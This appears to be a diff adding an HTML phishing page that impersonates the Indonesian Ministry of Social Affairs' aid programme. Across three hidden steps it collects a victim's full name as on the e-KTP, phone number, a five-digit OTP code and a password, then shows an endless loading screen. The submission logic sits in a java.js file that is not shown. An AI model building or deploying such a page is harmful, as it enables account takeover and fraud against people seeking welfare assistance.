@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bantuan Kementerian Sosial Republik Indonesia</title>
+
+    <!-- Link ke Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- Link ke CSS intl-tel-input -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+    />
+
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div id="page1" class="page">
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img
+            src="logo.png"
+            alt="Logo Negara"
+            class="navbar-img"
+            style="width: 80%; height: auto; padding: 10px"
+          />
+        </div>
+      </nav>
+
+      <div class="hero">
+        <div class="slider">
+          <div class="slides">
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+          </div>
+        </div>
+        <h4>MASUKKAN NAMA & NOMOR TELEPON</h4>
+        <div class="form-container">
+          <form id="registrationForm">
+            <label for="name" style="text-align: left; color: #010101">
+              Nama Lengkap Sesuai eKTP
+            </label>
+            <input
+              type="text"
+              id="name"
+              name="name"
+              placeholder="Nama Lengkap Anda"
+              required
+            />
+
+            <label for="phone" style="text-align: left; color: #010101">
+              Masukkan Nomor Telpon Anda
+            </label>
+            <input
+              type="tel"
+              id="phone"
+              name="phone"
+              placeholder="+62 812-2332-3434"
+              required
+            />
+            <br />
+            <button type="submit" class="btn">DAFTAR SEKARANG</button>
+          </form>
+        </div>
+        <img
+          src="str-3.jpeg"
+          alt=""
+          style="margin-top: 20px; margin-bottom: 50px"
+        />
+      </div>
+    </div>
+
+    <div id="page2" class="page" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img
+            src="logo.png"
+            alt="Logo Negara"
+            class="navbar-img"
+            style="width: 80%; height: auto; padding: 10px"
+          />
+        </div>
+      </nav>
+
+      <div class="hero">
+        <div class="slider">
+          <div class="slides">
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+          </div>
+          <h4>DAFTAR BANTUAN SEKARANG</h4>
+        </div>
+        <div class="form-container">
+          <p class="no-margin" style="font-size: 12px; color: #010101">
+            Silahkan Masukan Kode OTP Anda
+          </p>
+          <form id="otpForm">
+            <label for="otp-1">Masukan Kode-OTP</label>
+            <div class="otp-container">
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-1"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-2"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-3"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-4"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-5"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+            </div>
+            <button type="submit" class="btn">LANJUTKAN</button>
+          </form>
+        </div>
+        <img
+          src="str-3.jpeg"
+          alt=""
+          style="margin-top: 20px; margin-bottom: 50px"
+        />
+      </div>
+    </div>
+
+    <div id="page3" class="page" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img
+            src="logo.png"
+            alt="Logo Negara"
+            class="navbar-img"
+            style="width: 80%; height: auto; padding: 10px"
+          />
+        </div>
+      </nav>
+
+      <div class="hero">
+        <div class="slider">
+          <div class="slides">
+            <img src="ini.jpg" alt="Image 1" class="slide" />
+            <img src="ini.jpg" alt="Image 2" class="slide" />
+            <img src="ini.jpg" alt="Image 3" class="slide" />
+            <img src="ini.jpg" alt="Image 4" class="slide" />
+          </div>
+          <h4>DAFTAR BANTUAN SEKARANG</h4>
+        </div>
+        <div class="form-container">
+          <p id="kataSandi" style="font-size: 12px; color: #010101">
+            Silahkan Masukan kata sandi anda
+          </p>
+          <form id="passwordForm">
+            <input
+              type="password"
+              id="kata-sandi"
+              name="kata-sandi"
+              placeholder="Masukan kata sandi anda"
+              required
+            />
+            <button type="submit" class="btn" onclick="handleButtonClick()">
+              LANJUTKAN
+            </button>
+          </form>
+        </div>
+        <img
+          src="str-3.jpeg"
+          alt=""
+          style="margin-top: 20px; margin-bottom: 50px"
+        />
+      </div>
+    </div>
+
+    <footer>
+      <img src="ini1.png" alt="Logo Footer" />
+    </footer>
+
+    <div class="loading-screen" id="loadingScreen">
+      <img src="loading-loading-forever.gif" alt="Loading..." />
+      <br />
+      <p style="color: var(--primary-blue); margin-top: 10px; font-size: 14px">
+        Tunggu kami sedang menginput...
+      </p>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        let currentSlide = 0;
+
+        function showSlide(index) {
+          const slides = document.querySelector(".slides");
+          const totalSlides = document.querySelectorAll(".slide").length;
+          if (index >= totalSlides) currentSlide = 0; // Kembali ke slide pertama
+          if (index < 0) currentSlide = totalSlides - 1; // Kembali ke slide terakhir
+          slides.style.transform = `translateX(-${currentSlide * 100}%)`;
+        }
+
+        function nextSlide() {
+          currentSlide++;
+          showSlide(currentSlide);
+        }
+
+        // Otomatis geser slide setiap 3 detik
+        setInterval(nextSlide, 3000);
+      });
+    </script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const otpInputs = document.querySelectorAll(".otp-input");
+
+        otpInputs.forEach((input, index) => {
+          input.addEventListener("input", function () {
+            // Jika input sudah diisi, pindah ke input berikutnya
+            if (this.value.length === 1 && index < otpInputs.length - 1) {
+              otpInputs[index + 1].focus();
+            }
+          });
+
+          input.addEventListener("keydown", function (e) {
+            // Jika tombol backspace ditekan dan input kosong, pindah ke input sebelumnya
+            if (e.key === "Backspace" && this.value.length === 0 && index > 0) {
+              otpInputs[index - 1].focus();
+            }
+          });
+        });
+      });
+    </script>
+
+    <script src="java.js"></script>
+  </body>
+</html>
